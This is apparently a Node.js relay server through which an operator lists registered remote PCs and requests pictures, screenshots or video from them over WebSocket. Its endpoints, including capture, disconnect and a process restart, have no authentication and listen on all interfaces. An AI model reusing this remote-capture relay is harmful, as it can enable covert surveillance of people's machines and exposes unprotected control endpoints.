/**
 * Hiatme middleman server – runs alongside XAMPP.
 * - Clients connect via WebSocket and register (id, pcname, etc.).
 * - Tool Suite / website call HTTP API to list clients and request video/pictures.
 * - Server forwards media requests to the right client and returns the response.
 */

const http = require('http');
const url = require('url');
const Express = require('express');
const { WebSocketServer } = require('ws');

const HTTP_PORT = process.env.PORT || 3000;
const WS_PATH = '/ws';
const DASHBOARD_WS_PATH = '/dashboard-ws';

// Keep server up on unhandled errors (log and continue)
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err && err.message ? err.message : err);
});
process.on('unhandledRejection', (reason, p) => {
  console.error('Unhandled rejection:', reason);
});

// ---------------------------------------------------------------------------
// In-memory client list: clientId -> { ws, pcname, language, model, version, connectedAt }
// Pending media requests: requestId -> { resolve, reject, timeout }
// ---------------------------------------------------------------------------
const clients = new Map();
const pendingMediaRequests = new Map();
const MEDIA_REQUEST_TIMEOUT_MS = 30000;

// Dashboard WebSocket subscribers (get real-time client connect/disconnect)
const dashboardSockets = new Set();

function getClientList() {
  try {
    return Array.from(clients.entries()).map(([id, c]) => ({
      id,
      pcname: c.pcname || '',
      language: c.language || '',
      model: c.model || '',
      version: c.version || '',
      connectedAt: c.connectedAt || '',
    }));
  } catch (e) {
    console.error('getClientList:', e && e.message);
    return [];
  }
}

function broadcastDashboard(msg) {
  try {
    const data = JSON.stringify(msg);
    const list = Array.from(dashboardSockets);
    list.forEach((ws) => {
      try {
        if (ws && ws.readyState === 1) ws.send(data);
      } catch (e) { /* ignore */ }
    });
  } catch (e) {
    console.error('broadcastDashboard:', e && e.message);
  }
}

function safeSend(ws, obj) {
  try {
    if (!ws) return;
    if (ws.readyState !== 1) return;
    const data = JSON.stringify(obj);
    if (data) ws.send(data);
  } catch (e) {
    console.error('safeSend:', e && e.message);
  }
}

// ---------------------------------------------------------------------------
// HTTP app (for Tool Suite and future GoDaddy site)
// ---------------------------------------------------------------------------
const app = Express();
app.use(Express.json());
app.use(Express.static('public'));

// List connected clients (Tool Suite / website can call this)
app.get('/api/clients', (req, res) => {
  const list = Array.from(clients.entries()).map(([id, c]) => ({
    id,
    pcname: c.pcname,
    language: c.language,
    model: c.model,
    version: c.version,
    connectedAt: c.connectedAt,
  }));
  res.json({ clients: list });
});

// Request media from a client (picture, screenshot, or video stream request)
// Body: { clientId: string, mediaType: 'picture' | 'screenshot' | 'video' }
// Server forwards to client over WebSocket; client responds with data; we return it.
app.post('/api/request-media', (req, res) => {
  const { clientId, mediaType = 'picture' } = req.body || {};
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const client = clients.get(clientId);
  if (!client || !client.ws || client.ws.readyState !== 1) {
    return res.status(404).json({ error: 'Client not found or not connected', clientId });
  }

  const requestId = `req_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  const timeout = setTimeout(() => {
    if (pendingMediaRequests.has(requestId)) {
      pendingMediaRequests.delete(requestId);
      res.status(504).json({ error: 'Media request timed out', requestId });
    }
  }, MEDIA_REQUEST_TIMEOUT_MS);

  pendingMediaRequests.set(requestId, {
    resolve: (data) => {
      clearTimeout(timeout);
      pendingMediaRequests.delete(requestId);
      res.json(data);
    },
    reject: (err) => {
      clearTimeout(timeout);
      pendingMediaRequests.delete(requestId);
      res.status(502).json({ error: err || 'Client error' });
    },
  });

  try {
    client.ws.send(JSON.stringify({
      type: 'requestMedia',
      requestId,
      mediaType,
    }));
  } catch (e) {
    clearTimeout(timeout);
    pendingMediaRequests.delete(requestId);
    res.status(502).json({ error: e.message || 'Failed to send request to client' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    clients: clients.size,
    uptimeSeconds: Math.floor(process.uptime()),
  });
});

// Disconnect a client by id
app.post('/api/clients/:id/disconnect', (req, res) => {
  const id = req.params.id;
  const client = clients.get(id);
  if (!client) {
    return res.status(404).json({ error: 'Client not found', clientId: id });
  }
  try {
    if (client.ws && client.ws.readyState === 1) client.ws.close();
  } catch (e) { /* ignore */ }
  clients.delete(id);
  setImmediate(() => { try { broadcastDashboard({ type: 'clientDisconnected', clientId: id }); } catch (e) { console.error('broadcast:', e && e.message); } });
  res.json({ ok: true, message: 'Client disconnected' });
});

// Restart server (process exits; use nodemon so it restarts)
app.post('/api/restart', (req, res) => {
  res.json({ ok: true, message: 'Restarting...' });
  setImmediate(() => process.exit(0));
});

// ---------------------------------------------------------------------------
// WebSocket servers (clients + dashboard; one upgrade handler routes by path)
// ---------------------------------------------------------------------------
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });
const dashboardWss = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
  const pathname = url.parse(request.url).pathname;
  if (pathname === WS_PATH) {
    wss.handleUpgrade(request, socket, head, (ws) => {
      wss.emit('connection', ws, request);
    });
  } else if (pathname === DASHBOARD_WS_PATH) {
    dashboardWss.handleUpgrade(request, socket, head, (ws) => {
      dashboardWss.emit('connection', ws, request);
    });
  } else {
    socket.destroy();
  }
});

wss.on('connection', (ws, req) => {
  let clientId = null;
  try {
    ws.on('message', (raw) => {
      let msg;
      let str = '';
      try {
        str = typeof raw === 'string' ? raw : (raw && raw.toString ? raw.toString() : '');
        if (!str || !str.trim()) return;
        str = str.replace(/^\ufeff/, ''); // strip BOM
        msg = JSON.parse(str);
      } catch (e) {
        console.error('Invalid JSON from client, first 300 chars:', (str || '').slice(0, 300));
        setImmediate(() => { try { safeSend(ws, { type: 'error', message: 'invalid JSON' }); } catch (e2) { console.error('safeSend error:', e2 && e2.message); } });
        return;
      }
      try {
        switch (msg && msg.type) {
          case 'register': {
            const id = msg.id != null ? String(msg.id) : '';
            if (!id) {
              safeSend(ws, { type: 'error', message: 'id required' });
              return;
            }
            clientId = id;
            const connectedAt = new Date().toISOString();
            const pcname = String(msg.pcname || '');
            const language = String(msg.language || '');
            const model = String(msg.model || '');
            const version = String(msg.version || '');
            clients.set(clientId, {
              ws,
              pcname,
              language,
              model,
              version,
              connectedAt,
            });
            safeSend(ws, { type: 'registered', clientId });
            const payload = { type: 'clientConnected', client: { id: clientId, pcname, language, model, version, connectedAt } };
            setImmediate(() => { try { broadcastDashboard(payload); } catch (e) { console.error('broadcast:', e && e.message); } });
            break;
          }
          case 'mediaResponse': {
            const requestId = msg.requestId;
            const pending = requestId ? pendingMediaRequests.get(requestId) : null;
            if (pending) {
              if (msg.error) pending.reject(msg.error);
              else pending.resolve({ data: msg.data, mimeType: msg.mimeType || 'image/jpeg' });
            }
            break;
          }
          default:
            safeSend(ws, { type: 'error', message: 'unknown message type' });
        }
      } catch (e) {
        console.error('Client message handler:', e && e.message);
        safeSend(ws, { type: 'error', message: 'server error' });
      }
    });

    ws.on('close', () => {
      try {
        if (clientId) {
          clients.delete(clientId);
          setImmediate(() => { try { broadcastDashboard({ type: 'clientDisconnected', clientId }); } catch (e) { console.error('broadcast:', e && e.message); } });
        }
      } catch (e) { console.error('close handler:', e && e.message); }
    });

    ws.on('error', () => {
      try {
        if (clientId) {
          clients.delete(clientId);
          setImmediate(() => { try { broadcastDashboard({ type: 'clientDisconnected', clientId }); } catch (e) { console.error('broadcast:', e && e.message); } });
        }
      } catch (e) { console.error('error handler:', e && e.message); }
    });
  } catch (e) {
    console.error('Connection setup:', e && e.message);
    try { ws.close(); } catch (e2) {}
  }
});

wss.on('error', (err) => {
  console.error('Client WSS error:', err && err.message);
});

// ---------------------------------------------------------------------------
// Dashboard WebSocket (real-time updates for the admin UI)
// ---------------------------------------------------------------------------
dashboardWss.on('connection', (ws) => {
  try {
    dashboardSockets.add(ws);
    setImmediate(() => {
      try {
        safeSend(ws, { type: 'snapshot', clients: getClientList(), uptimeSeconds: Math.floor(process.uptime()) });
      } catch (e) { console.error('Dashboard snapshot:', e && e.message); }
    });
    ws.on('close', () => { try { dashboardSockets.delete(ws); } catch (e) {} });
    ws.on('error', () => { try { dashboardSockets.delete(ws); } catch (e) {} });
  } catch (e) {
    console.error('Dashboard connection:', e && e.message);
    try { ws.close(); } catch (e2) {}
  }
});
dashboardWss.on('error', (err) => {
  console.error('Dashboard WSS error:', err && err.message);
});

// ---------------------------------------------------------------------------
// Start
// ---------------------------------------------------------------------------
server.listen(HTTP_PORT, '0.0.0.0', () => {
  console.log(`Hiatme server listening: http://localhost:${HTTP_PORT} (and http://127.0.0.1:${HTTP_PORT})`);
  console.log(`  WebSocket (clients): ws://127.0.0.1:${HTTP_PORT}${WS_PATH}`);
  console.log(`  API: GET /api/clients, POST /api/request-media, GET /api/health`);
});
